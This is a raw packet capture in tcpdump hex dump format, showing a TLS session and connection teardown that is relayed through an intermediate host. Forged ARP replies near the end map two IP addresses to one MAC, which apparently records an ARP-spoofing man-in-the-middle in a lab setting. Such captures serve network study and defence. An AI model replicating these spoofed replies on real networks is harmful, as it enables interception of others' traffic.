    193.226.51.9.443 > 198.7.0.3.33878: Flags [P.], cksum 0xff50 (correct), seq 1484070905:1484071534, ack 3621698291, win 54, options [nop,nop,TS val 2477391806 ecr 3077947431], length 629
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 02a9 fc0d 4000 2f06 924b c1e2 3309  E.....@./..K..3.
	0x0020:  c607 0003 01bb 8456 5875 1ff9 d7de baf3  .......VXu......
	0x0030:  8018 0036 ff50 0000 0101 080a 93a9 ffbe  ...6.P..........
	0x0040:  b775 c027 f879 5e2b 040b 5ffb 3a1b ccb9  .u.'.y^+.._.:...
	0x0050:  ad1c 9376 d768 cc17 bee6 7737 a82a 63f7  ...v.h....w7.*c.
	0x0060:  db9f 14bd ed53 6921 1104 2c28 c436 7469  .....Si!..,(.6ti
	0x0070:  977d 1dd8 1830 8f60 7f43 e79b ba22 8a84  .}...0.`.C..."..
	0x0080:  59ac 68cb ea11 2d9a b8e0 02d0 46b4 5f40  Y.h...-.....F._@
	0x0090:  f9f0 07da dfa0 4191 7886 fa0c 7842 1603  ......A.x...xB..
	0x00a0:  0102 0d0c 0002 0900 80d6 7de4 40cb bbdc  ..........}.@...
	0x00b0:  1936 d693 d34a fd0a d50c 84d2 39a4 5f52  .6...J......9._R
	0x00c0:  0bb8 8174 cb98 bce9 5184 9f91 2e63 9c72  ...t....Q....c.r
	0x00d0:  fb13 b4b4 d717 7e16 d55a c179 ba42 0b2a  ......~..Z.y.B.*
	0x00e0:  29fe 324a 467a 635e 81ff 5901 377b eddc  ).2JFzc^..Y.7{..
	0x00f0:  fd33 168a 461a ad3b 72da e886 0078 045b  .3..F..;r....x.[
	0x0100:  07a7 dbca 7874 087d 1510 ea9f cc9d dd33  ....xt.}.......3
	0x0110:  0507 dd62 db88 aeaa 747d e0f4 d6e2 bd68  ...b....t}.....h
	0x0120:  b0e7 393e 0f24 218e b300 0102 0080 7ff4  ..9>.$!.........
	0x0130:  8b29 e3ec d90d 9b94 6020 a24a 01ff dbca  .)......`..J....
	0x0140:  399d 26ba 860b 9d32 536e 7019 7520 e38b  9.&....2Snp.u...
	0x0150:  961e b284 35aa 4cd2 ac49 cc6c c5cf 7e45  ....5.L..I.l..~E
	0x0160:  bd9a 3d66 70da 5301 1d6d 9539 ae7e a052  ..=fp.S..m.9.~.R
	0x0170:  fdef 47eb 2166 426f 7e17 9999 a21f c528  ..G.!fBo~......(
	0x0180:  3343 f3c2 cf8a 0290 ffad c4b9 7885 bad4  3C..........x...
	0x0190:  1467 ce1f 5820 12c3 9966 8bd9 f376 2555  .g..X....f...v%U
	0x01a0:  3c23 1abc aec7 cf73 bd6e 126f eab7 0100  <#.....s.n.o....
	0x01b0:  016d 9ec4 cc56 582b b869 302a 5244 c8b1  .m...VX+.i0*RD..
	0x01c0:  ed83 e37b 7d59 a5ab b1c3 4671 00ec baf1  ...{}Y....Fq....
	0x01d0:  5477 bea0 4e5c 9c3e 48c7 8dae 4458 36cb  Tw..N\.>H...DX6.
	0x01e0:  ba12 9e23 8512 7534 024f 6a10 a41d 33ab  ...#..u4.Oj...3.
	0x01f0:  2d76 478d 77be 58d9 81a6 3501 8b19 bb9e  -vG.w.X...5.....
	0x0200:  715c e80d e2e9 3e20 05f9 8c5a 73e8 89a0  q\....>....Zs...
	0x0210:  64b6 212c 9b13 4c5a ad61 90ac b46a 911c  d.!,..LZ.a...j..
	0x0220:  0987 8c6c 1ee9 e1d9 edcb aa26 9b17 2589  ...l.......&..%.
	0x0230:  7ef4 11d3 8acd 5142 b527 0ae7 dfa3 727e  ~.....QB.'....r~
	0x0240:  bba0 267b 135f c734 53f3 d37f 348a 87b0  ..&{._.4S...4...
	0x0250:  4fb8 d5f6 805e 0db0 2f3b 93b3 8072 f2d2  O....^../;...r..
	0x0260:  9b6c acd4 f23d 9983 a06d 8792 8bb0 2e91  .l...=...m......
	0x0270:  1bef 6b3d 6fc0 d296 b5c5 08b3 b59a b631  ..k=o..........1
	0x0280:  2708 3896 a977 e73c def6 d859 b3c2 881d  '.8..w.<...Y....
	0x0290:  9760 d5fb 56b1 bc5f 35ea 2736 05a1 a024  .`..V.._5.'6...$
	0x02a0:  cf8a 4615 2811 54c9 5103 f6b8 74e5 0d83  ..F.(.T.Q...t...
	0x02b0:  1603 0100 040e 0000 00                   .........
IP (tos 0x0, ttl 46, id 64525, offset 0, flags [DF], proto TCP (6), length 681)
    193.226.51.9.443 > 198.7.0.2.33878: Flags [P.], cksum 0xff51 (correct), seq 1484070905:1484071534, ack 3621698291, win 54, options [nop,nop,TS val 2477391806 ecr 3077947431], length 629
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 02a9 fc0d 4000 2e06 934c c1e2 3309  E.....@....L..3.
	0x0020:  c607 0002 01bb 8456 5875 1ff9 d7de baf3  .......VXu......
	0x0030:  8018 0036 ff51 0000 0101 080a 93a9 ffbe  ...6.Q..........
	0x0040:  b775 c027 f879 5e2b 040b 5ffb 3a1b ccb9  .u.'.y^+.._.:...
	0x0050:  ad1c 9376 d768 cc17 bee6 7737 a82a 63f7  ...v.h....w7.*c.
	0x0060:  db9f 14bd ed53 6921 1104 2c28 c436 7469  .....Si!..,(.6ti
	0x0070:  977d 1dd8 1830 8f60 7f43 e79b ba22 8a84  .}...0.`.C..."..
	0x0080:  59ac 68cb ea11 2d9a b8e0 02d0 46b4 5f40  Y.h...-.....F._@
	0x0090:  f9f0 07da dfa0 4191 7886 fa0c 7842 1603  ......A.x...xB..
	0x00a0:  0102 0d0c 0002 0900 80d6 7de4 40cb bbdc  ..........}.@...
	0x00b0:  1936 d693 d34a fd0a d50c 84d2 39a4 5f52  .6...J......9._R
	0x00c0:  0bb8 8174 cb98 bce9 5184 9f91 2e63 9c72  ...t....Q....c.r
	0x00d0:  fb13 b4b4 d717 7e16 d55a c179 ba42 0b2a  ......~..Z.y.B.*
	0x00e0:  29fe 324a 467a 635e 81ff 5901 377b eddc  ).2JFzc^..Y.7{..
	0x00f0:  fd33 168a 461a ad3b 72da e886 0078 045b  .3..F..;r....x.[
	0x0100:  07a7 dbca 7874 087d 1510 ea9f cc9d dd33  ....xt.}.......3
	0x0110:  0507 dd62 db88 aeaa 747d e0f4 d6e2 bd68  ...b....t}.....h
	0x0120:  b0e7 393e 0f24 218e b300 0102 0080 7ff4  ..9>.$!.........
	0x0130:  8b29 e3ec d90d 9b94 6020 a24a 01ff dbca  .)......`..J....
	0x0140:  399d 26ba 860b 9d32 536e 7019 7520 e38b  9.&....2Snp.u...
	0x0150:  961e b284 35aa 4cd2 ac49 cc6c c5cf 7e45  ....5.L..I.l..~E
	0x0160:  bd9a 3d66 70da 5301 1d6d 9539 ae7e a052  ..=fp.S..m.9.~.R
	0x0170:  fdef 47eb 2166 426f 7e17 9999 a21f c528  ..G.!fBo~......(
	0x0180:  3343 f3c2 cf8a 0290 ffad c4b9 7885 bad4  3C..........x...
	0x0190:  1467 ce1f 5820 12c3 9966 8bd9 f376 2555  .g..X....f...v%U
	0x01a0:  3c23 1abc aec7 cf73 bd6e 126f eab7 0100  <#.....s.n.o....
	0x01b0:  016d 9ec4 cc56 582b b869 302a 5244 c8b1  .m...VX+.i0*RD..
	0x01c0:  ed83 e37b 7d59 a5ab b1c3 4671 00ec baf1  ...{}Y....Fq....
	0x01d0:  5477 bea0 4e5c 9c3e 48c7 8dae 4458 36cb  Tw..N\.>H...DX6.
	0x01e0:  ba12 9e23 8512 7534 024f 6a10 a41d 33ab  ...#..u4.Oj...3.
	0x01f0:  2d76 478d 77be 58d9 81a6 3501 8b19 bb9e  -vG.w.X...5.....
	0x0200:  715c e80d e2e9 3e20 05f9 8c5a 73e8 89a0  q\....>....Zs...
	0x0210:  64b6 212c 9b13 4c5a ad61 90ac b46a 911c  d.!,..LZ.a...j..
	0x0220:  0987 8c6c 1ee9 e1d9 edcb aa26 9b17 2589  ...l.......&..%.
	0x0230:  7ef4 11d3 8acd 5142 b527 0ae7 dfa3 727e  ~.....QB.'....r~
	0x0240:  bba0 267b 135f c734 53f3 d37f 348a 87b0  ..&{._.4S...4...
	0x0250:  4fb8 d5f6 805e 0db0 2f3b 93b3 8072 f2d2  O....^../;...r..
	0x0260:  9b6c acd4 f23d 9983 a06d 8792 8bb0 2e91  .l...=...m......
	0x0270:  1bef 6b3d 6fc0 d296 b5c5 08b3 b59a b631  ..k=o..........1
	0x0280:  2708 3896 a977 e73c def6 d859 b3c2 881d  '.8..w.<...Y....
	0x0290:  9760 d5fb 56b1 bc5f 35ea 2736 05a1 a024  .`..V.._5.'6...$
	0x02a0:  cf8a 4615 2811 54c9 5103 f6b8 74e5 0d83  ..F.(.T.Q...t...
	0x02b0:  1603 0100 040e 0000 00                   .........
IP (tos 0x0, ttl 64, id 18024, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.2.33878 > 193.226.51.9.443: Flags [.], cksum 0xbb1b (incorrect -> 0x1aec), ack 1484071534, win 493, options [nop,nop,TS val 3077947465 ecr 2477391806], length 0
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 0034 4668 4000 4006 3967 c607 0002  E..4Fh@.@.9g....
	0x0020:  c1e2 3309 8456 01bb d7de baf3 5875 226e  ..3..V......Xu"n
	0x0030:  8010 01ed bb1b 0000 0101 080a b775 c049  .............u.I
	0x0040:  93a9 ffbe                                ....
IP (tos 0x0, ttl 63, id 18024, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.3.33878 > 193.226.51.9.443: Flags [.], cksum 0xbb1c (incorrect -> 0x1aeb), ack 1484071534, win 493, options [nop,nop,TS val 3077947465 ecr 2477391806], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0034 4668 4000 3f06 3a66 c607 0003  E..4Fh@.?.:f....
	0x0020:  c1e2 3309 8456 01bb d7de baf3 5875 226e  ..3..V......Xu"n
	0x0030:  8010 01ed bb1c 0000 0101 080a b775 c049  .............u.I
	0x0040:  93a9 ffbe                                ....
IP (tos 0x0, ttl 64, id 18025, offset 0, flags [DF], proto TCP (6), length 250)
    198.7.0.2.33878 > 193.226.51.9.443: Flags [P.], cksum 0xbbe1 (incorrect -> 0x85b0), seq 3621698291:3621698489, ack 1484071534, win 501, options [nop,nop,TS val 3077947469 ecr 2477391806], length 198
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 00fa 4669 4000 4006 38a0 c607 0002  E...Fi@.@.8.....
	0x0020:  c1e2 3309 8456 01bb d7de baf3 5875 226e  ..3..V......Xu"n
	0x0030:  8018 01f5 bbe1 0000 0101 080a b775 c04d  .............u.M
	0x0040:  93a9 ffbe 1603 0100 8610 0000 8200 802f  .............../
	0x0050:  f271 f9b4 3d4b df9e c2f5 aedb d290 4c78  .q..=K........Lx
	0x0060:  5881 c442 9a38 4c0b 8571 b4c7 1f0c 23e5  X..B.8L..q....#.
	0x0070:  8067 0ef0 223f 68e0 5db8 6bce 9fa5 f0e8  .g.."?h.].k.....
	0x0080:  b8e9 7ded 721e d02e d8a8 e7d2 9971 2047  ..}.r........q.G
	0x0090:  c481 7918 b69d f2b8 d62a 18fb 54c8 b13e  ..y......*..T..>
	0x00a0:  ef5d 179b 630a 9da1 a640 8d78 8ff5 3c6b  .]..c....@.x..<k
	0x00b0:  876b b1f8 344f 0687 6d44 71ed eb4b 72dc  .k..4O..mDq..Kr.
	0x00c0:  2a15 579e b30a 0b78 9301 f9c8 618e 3f14  *.W....x....a.?.
	0x00d0:  0301 0001 0116 0301 0030 ec9a b77c 4a80  .........0...|J.
	0x00e0:  c6f7 e715 36df 8d34 913c 83e6 fc97 3fc4  ....6..4.<....?.
	0x00f0:  acc2 721e 984f 0242 6074 64da 8f6a 2d47  ..r..O.B`td..j-G
	0x0100:  9a29 24ed c1ac 49b6 b096                 .)$...I...
IP (tos 0x0, ttl 47, id 64526, offset 0, flags [DF], proto TCP (6), length 334)
    193.226.51.9.443 > 198.7.0.3.33878: Flags [P.], cksum 0xd0a6 (correct), seq 1484071534:1484071816, ack 3621698489, win 62, options [nop,nop,TS val 2477391813 ecr 3077947469], length 282
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 014e fc0e 4000 2f06 93a5 c1e2 3309  E..N..@./.....3.
	0x0020:  c607 0003 01bb 8456 5875 226e d7de bbb9  .......VXu"n....
	0x0030:  8018 003e d0a6 0000 0101 080a 93a9 ffc5  ...>............
	0x0040:  b775 c04d 1603 0100 da04 0000 d600 0000  .u.M............
	0x0050:  0000 d0f9 71af f14b 5792 a675 fd58 dce8  ....q..KW..u.X..
	0x0060:  e478 1f5c 264d 4584 c147 516e b111 cb5e  .x.\&ME..GQn...^
	0x0070:  6382 b025 13b4 4e79 b235 bd16 d018 fc74  c..%..Ny.5.....t
	0x0080:  542d 7565 8497 9631 689c 0914 4852 1db0  T-ue...1h...HR..
	0x0090:  fb3e dfb1 ed7a 4d28 fbc3 d668 b5ea e8f6  .>...zM(...h....
	0x00a0:  01e6 d7c1 e32a 658c 80dd 08c3 806d 2278  .....*e......m"x
	0x00b0:  e5f6 a367 4cfc 1819 ae03 1006 08c4 eaf1  ...gL...........
	0x00c0:  3890 c31b e019 8b32 0549 e8a6 d425 a522  8......2.I...%."
	0x00d0:  a1e1 7b90 f7d5 a921 91f3 e92e 2be2 6b8e  ..{....!....+.k.
	0x00e0:  0c39 a85f 2eb2 f96b eafa bfd6 09fd 75b4  .9._...k......u.
	0x00f0:  3cd4 2cda 7842 8b20 6f3f 5994 e1cd bb00  <.,.xB..o?Y.....
	0x0100:  6cbd a1e0 367f 0bb2 0b04 d518 2b8b 656e  l...6.......+.en
	0x0110:  7af1 9734 7911 e884 6f09 ce21 e6e8 4cff  z..4y...o..!..L.
	0x0120:  8af1 d814 0301 0001 0116 0301 0030 a989  .............0..
	0x0130:  de99 f711 5482 9bf4 7b20 ffb4 e741 3ae7  ....T...{....A:.
	0x0140:  b2b2 cc9f 377b 10e2 b834 9a70 b853 24c0  ....7{...4.p.S$.
	0x0150:  d644 b61e 56cd bdd8 1820 b2ec 9a26       .D..V........&
IP (tos 0x0, ttl 46, id 64526, offset 0, flags [DF], proto TCP (6), length 334)
    193.226.51.9.443 > 198.7.0.2.33878: Flags [P.], cksum 0xd0a7 (correct), seq 1484071534:1484071816, ack 3621698489, win 62, options [nop,nop,TS val 2477391813 ecr 3077947469], length 282
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 014e fc0e 4000 2e06 94a6 c1e2 3309  E..N..@.......3.
	0x0020:  c607 0002 01bb 8456 5875 226e d7de bbb9  .......VXu"n....
	0x0030:  8018 003e d0a7 0000 0101 080a 93a9 ffc5  ...>............
	0x0040:  b775 c04d 1603 0100 da04 0000 d600 0000  .u.M............
	0x0050:  0000 d0f9 71af f14b 5792 a675 fd58 dce8  ....q..KW..u.X..
	0x0060:  e478 1f5c 264d 4584 c147 516e b111 cb5e  .x.\&ME..GQn...^
	0x0070:  6382 b025 13b4 4e79 b235 bd16 d018 fc74  c..%..Ny.5.....t
	0x0080:  542d 7565 8497 9631 689c 0914 4852 1db0  T-ue...1h...HR..
	0x0090:  fb3e dfb1 ed7a 4d28 fbc3 d668 b5ea e8f6  .>...zM(...h....
	0x00a0:  01e6 d7c1 e32a 658c 80dd 08c3 806d 2278  .....*e......m"x
	0x00b0:  e5f6 a367 4cfc 1819 ae03 1006 08c4 eaf1  ...gL...........
	0x00c0:  3890 c31b e019 8b32 0549 e8a6 d425 a522  8......2.I...%."
	0x00d0:  a1e1 7b90 f7d5 a921 91f3 e92e 2be2 6b8e  ..{....!....+.k.
	0x00e0:  0c39 a85f 2eb2 f96b eafa bfd6 09fd 75b4  .9._...k......u.
	0x00f0:  3cd4 2cda 7842 8b20 6f3f 5994 e1cd bb00  <.,.xB..o?Y.....
	0x0100:  6cbd a1e0 367f 0bb2 0b04 d518 2b8b 656e  l...6.......+.en
	0x0110:  7af1 9734 7911 e884 6f09 ce21 e6e8 4cff  z..4y...o..!..L.
	0x0120:  8af1 d814 0301 0001 0116 0301 0030 a989  .............0..
	0x0130:  de99 f711 5482 9bf4 7b20 ffb4 e741 3ae7  ....T...{....A:.
	0x0140:  b2b2 cc9f 377b 10e2 b834 9a70 b853 24c0  ....7{...4.p.S$.
	0x0150:  d644 b61e 56cd bdd8 1820 b2ec 9a26       .D..V........&
IP (tos 0x0, ttl 64, id 18026, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.2.33878 > 193.226.51.9.443: Flags [.], cksum 0xbb1b (incorrect -> 0x18e2), ack 1484071816, win 499, options [nop,nop,TS val 3077947494 ecr 2477391813], length 0
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 0034 466a 4000 4006 3965 c607 0002  E..4Fj@.@.9e....
	0x0020:  c1e2 3309 8456 01bb d7de bbb9 5875 2388  ..3..V......Xu#.
	0x0030:  8010 01f3 bb1b 0000 0101 080a b775 c066  .............u.f
	0x0040:  93a9 ffc5                                ....
IP (tos 0x0, ttl 63, id 18026, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.3.33878 > 193.226.51.9.443: Flags [.], cksum 0xbb1c (incorrect -> 0x18e1), ack 1484071816, win 499, options [nop,nop,TS val 3077947494 ecr 2477391813], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0034 466a 4000 3f06 3a64 c607 0003  E..4Fj@.?.:d....
	0x0020:  c1e2 3309 8456 01bb d7de bbb9 5875 2388  ..3..V......Xu#.
	0x0030:  8010 01f3 bb1c 0000 0101 080a b775 c066  .............u.f
	0x0040:  93a9 ffc5                                ....
IP (tos 0x0, ttl 64, id 18027, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.2.33878 > 193.226.51.9.443: Flags [F.], cksum 0xbb1b (incorrect -> 0x18de), seq 3621698489, ack 1484071816, win 501, options [nop,nop,TS val 3077947495 ecr 2477391813], length 0
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 0034 466b 4000 4006 3964 c607 0002  E..4Fk@.@.9d....
	0x0020:  c1e2 3309 8456 01bb d7de bbb9 5875 2388  ..3..V......Xu#.
	0x0030:  8011 01f5 bb1b 0000 0101 080a b775 c067  .............u.g
	0x0040:  93a9 ffc5                                ....
IP (tos 0x0, ttl 63, id 18027, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.3.33878 > 193.226.51.9.443: Flags [F.], cksum 0xbb1c (incorrect -> 0x18dd), seq 3621698489, ack 1484071816, win 501, options [nop,nop,TS val 3077947495 ecr 2477391813], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0034 466b 4000 3f06 3a63 c607 0003  E..4Fk@.?.:c....
	0x0020:  c1e2 3309 8456 01bb d7de bbb9 5875 2388  ..3..V......Xu#.
	0x0030:  8011 01f5 bb1c 0000 0101 080a b775 c067  .............u.g
	0x0040:  93a9 ffc5                                ....
IP (tos 0x0, ttl 64, id 27494, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.2.47398 > 193.226.51.9.80: Flags [F.], cksum 0xbb1b (incorrect -> 0x67f9), seq 4029134616, ack 3524465626, win 501, options [nop,nop,TS val 3077947497 ecr 2477391786], length 0
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 0034 6b66 4000 4006 1469 c607 0002  E..4kf@.@..i....
	0x0020:  c1e2 3309 b926 0050 f027 b718 d213 13da  ..3..&.P.'......
	0x0030:  8011 01f5 bb1b 0000 0101 080a b775 c069  .............u.i
	0x0040:  93a9 ffaa                                ....
IP (tos 0x0, ttl 63, id 27494, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.3.47398 > 193.226.51.9.80: Flags [F.], cksum 0xbb1c (incorrect -> 0x67f8), seq 4029134616, ack 3524465626, win 501, options [nop,nop,TS val 3077947497 ecr 2477391786], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0034 6b66 4000 3f06 1568 c607 0003  E..4kf@.?..h....
	0x0020:  c1e2 3309 b926 0050 f027 b718 d213 13da  ..3..&.P.'......
	0x0030:  8011 01f5 bb1c 0000 0101 080a b775 c069  .............u.i
	0x0040:  93a9 ffaa                                ....
IP (tos 0x0, ttl 47, id 64527, offset 0, flags [DF], proto TCP (6), length 89)
    193.226.51.9.443 > 198.7.0.3.33878: Flags [P.], cksum 0xccc2 (correct), seq 1484071816:1484071853, ack 3621698490, win 62, options [nop,nop,TS val 2477391819 ecr 3077947495], length 37
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 0059 fc0f 4000 2f06 9499 c1e2 3309  E..Y..@./.....3.
	0x0020:  c607 0003 01bb 8456 5875 2388 d7de bbba  .......VXu#.....
	0x0030:  8018 003e ccc2 0000 0101 080a 93a9 ffcb  ...>............
	0x0040:  b775 c067 1503 0100 202c 9336 6a27 db5d  .u.g.....,.6j'.]
	0x0050:  13d9 bf99 21f7 e4cd 0f19 90cd 37cc 2b18  ....!.......7.+.
	0x0060:  cf8d ed3b 4aae e737 73                   ...;J..7s
IP (tos 0x0, ttl 46, id 64527, offset 0, flags [DF], proto TCP (6), length 89)
    193.226.51.9.443 > 198.7.0.2.33878: Flags [P.], cksum 0xccc3 (correct), seq 1484071816:1484071853, ack 3621698490, win 62, options [nop,nop,TS val 2477391819 ecr 3077947495], length 37
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0059 fc0f 4000 2e06 959a c1e2 3309  E..Y..@.......3.
	0x0020:  c607 0002 01bb 8456 5875 2388 d7de bbba  .......VXu#.....
	0x0030:  8018 003e ccc3 0000 0101 080a 93a9 ffcb  ...>............
	0x0040:  b775 c067 1503 0100 202c 9336 6a27 db5d  .u.g.....,.6j'.]
	0x0050:  13d9 bf99 21f7 e4cd 0f19 90cd 37cc 2b18  ....!.......7.+.
	0x0060:  cf8d ed3b 4aae e737 73                   ...;J..7s
IP (tos 0x0, ttl 47, id 64528, offset 0, flags [DF], proto TCP (6), length 52)
    193.226.51.9.443 > 198.7.0.3.33878: Flags [F.], cksum 0x1a68 (correct), seq 1484071853, ack 3621698490, win 62, options [nop,nop,TS val 2477391819 ecr 3077947495], length 0
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 0034 fc10 4000 2f06 94bd c1e2 3309  E..4..@./.....3.
	0x0020:  c607 0003 01bb 8456 5875 23ad d7de bbba  .......VXu#.....
	0x0030:  8011 003e 1a68 0000 0101 080a 93a9 ffcb  ...>.h..........
	0x0040:  b775 c067                                .u.g
IP (tos 0x0, ttl 46, id 64528, offset 0, flags [DF], proto TCP (6), length 52)
    193.226.51.9.443 > 198.7.0.2.33878: Flags [F.], cksum 0x1a69 (correct), seq 1484071853, ack 3621698490, win 62, options [nop,nop,TS val 2477391819 ecr 3077947495], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0034 fc10 4000 2e06 95be c1e2 3309  E..4..@.......3.
	0x0020:  c607 0002 01bb 8456 5875 23ad d7de bbba  .......VXu#.....
	0x0030:  8011 003e 1a69 0000 0101 080a 93a9 ffcb  ...>.i..........
	0x0040:  b775 c067                                .u.g
IP (tos 0x0, ttl 47, id 1853, offset 0, flags [DF], proto TCP (6), length 52)
    193.226.51.9.80 > 198.7.0.3.47398: Flags [F.], cksum 0x6995 (correct), seq 3524465626, ack 4029134617, win 54, options [nop,nop,TS val 2477391819 ecr 3077947497], length 0
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 0034 073d 4000 2f06 8991 c1e2 3309  E..4.=@./.....3.
	0x0020:  c607 0003 0050 b926 d213 13da f027 b719  .....P.&.....'..
	0x0030:  8011 0036 6995 0000 0101 080a 93a9 ffcb  ...6i...........
	0x0040:  b775 c069                                .u.i
IP (tos 0x0, ttl 46, id 1853, offset 0, flags [DF], proto TCP (6), length 52)
    193.226.51.9.80 > 198.7.0.2.47398: Flags [F.], cksum 0x6996 (correct), seq 3524465626, ack 4029134617, win 54, options [nop,nop,TS val 2477391819 ecr 3077947497], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0034 073d 4000 2e06 8a92 c1e2 3309  E..4.=@.......3.
	0x0020:  c607 0002 0050 b926 d213 13da f027 b719  .....P.&.....'..
	0x0030:  8011 0036 6996 0000 0101 080a 93a9 ffcb  ...6i...........
	0x0040:  b775 c069                                .u.i
IP (tos 0x0, ttl 64, id 27495, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.2.47398 > 193.226.51.9.80: Flags [.], cksum 0xbb1b (incorrect -> 0x67c0), ack 3524465627, win 501, options [nop,nop,TS val 3077947520 ecr 2477391819], length 0
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 0034 6b67 4000 4006 1468 c607 0002  E..4kg@.@..h....
	0x0020:  c1e2 3309 b926 0050 f027 b719 d213 13db  ..3..&.P.'......
	0x0030:  8010 01f5 bb1b 0000 0101 080a b775 c080  .............u..
	0x0040:  93a9 ffcb                                ....
IP (tos 0x0, ttl 63, id 27495, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.3.47398 > 193.226.51.9.80: Flags [.], cksum 0xbb1c (incorrect -> 0x67bf), ack 3524465627, win 501, options [nop,nop,TS val 3077947520 ecr 2477391819], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0034 6b67 4000 3f06 1567 c607 0003  E..4kg@.?..g....
	0x0020:  c1e2 3309 b926 0050 f027 b719 d213 13db  ..3..&.P.'......
	0x0030:  8010 01f5 bb1c 0000 0101 080a b775 c080  .............u..
	0x0040:  93a9 ffcb                                ....
ARP, Ethernet (len 6), IPv4 (len 4), Reply 198.7.0.2 is-at 02:42:c6:07:00:03, length 28
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0806  .......B........
	0x0010:  0001 0800 0604 0002 0242 c607 0003 c607  .........B......
	0x0020:  0002 0242 c607 0001 c607 0001            ...B........
ARP, Ethernet (len 6), IPv4 (len 4), Reply 198.7.0.1 is-at 02:42:c6:07:00:03, length 28
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0806  .......B........
	0x0010:  0001 0800 0604 0002 0242 c607 0003 c607  .........B......
	0x0020:  0001 0242 c607 0002 c607 0002            ...B........
IP (tos 0x0, ttl 47, id 64529, offset 0, flags [DF], proto TCP (6), length 89)
    193.226.51.9.443 > 198.7.0.3.33878: Flags [P.], cksum 0xcc8a (correct), seq 1484071816:1484071853, ack 3621698490, win 62, options [nop,nop,TS val 2477391875 ecr 3077947495], length 37
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 0059 fc11 4000 2f06 9497 c1e2 3309  E..Y..@./.....3.
	0x0020:  c607 0003 01bb 8456 5875 2388 d7de bbba  .......VXu#.....
	0x0030:  8018 003e cc8a 0000 0101 080a 93aa 0003  ...>............
	0x0040:  b775 c067 1503 0100 202c 9336 6a27 db5d  .u.g.....,.6j'.]
	0x0050:  13d9 bf99 21f7 e4cd 0f19 90cd 37cc 2b18  ....!.......7.+.
	0x0060:  cf8d ed3b 4aae e737 73                   ...;J..7s
IP (tos 0x0, ttl 46, id 64529, offset 0, flags [DF], proto TCP (6), length 89)
    193.226.51.9.443 > 198.7.0.2.33878: Flags [P.], cksum 0xcc8b (correct), seq 1484071816:1484071853, ack 3621698490, win 62, options [nop,nop,TS val 2477391875 ecr 3077947495], length 37
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0059 fc11 4000 2e06 9598 c1e2 3309  E..Y..@.......3.
	0x0020:  c607 0002 01bb 8456 5875 2388 d7de bbba  .......VXu#.....
	0x0030:  8018 003e cc8b 0000 0101 080a 93aa 0003  ...>............
	0x0040:  b775 c067 1503 0100 202c 9336 6a27 db5d  .u.g.....,.6j'.]
	0x0050:  13d9 bf99 21f7 e4cd 0f19 90cd 37cc 2b18  ....!.......7.+.
	0x0060:  cf8d ed3b 4aae e737 73                   ...;J..7s
IP (tos 0x0, ttl 47, id 64530, offset 0, flags [DF], proto TCP (6), length 89)
    193.226.51.9.443 > 198.7.0.3.33878: Flags [P.], cksum 0xcc1a (correct), seq 1484071816:1484071853, ack 3621698490, win 62, options [nop,nop,TS val 2477391987 ecr 3077947495], length 37
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 0059 fc12 4000 2f06 9496 c1e2 3309  E..Y..@./.....3.
	0x0020:  c607 0003 01bb 8456 5875 2388 d7de bbba  .......VXu#.....
	0x0030:  8018 003e cc1a 0000 0101 080a 93aa 0073  ...>...........s
	0x0040:  b775 c067 1503 0100 202c 9336 6a27 db5d  .u.g.....,.6j'.]
	0x0050:  13d9 bf99 21f7 e4cd 0f19 90cd 37cc 2b18  ....!.......7.+.
	0x0060:  cf8d ed3b 4aae e737 73                   ...;J..7s
IP (tos 0x0, ttl 46, id 64530, offset 0, flags [DF], proto TCP (6), length 89)
    193.226.51.9.443 > 198.7.0.2.33878: Flags [P.], cksum 0xcc1b (correct), seq 1484071816:1484071853, ack 3621698490, win 62, options [nop,nop,TS val 2477391987 ecr 3077947495], length 37
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
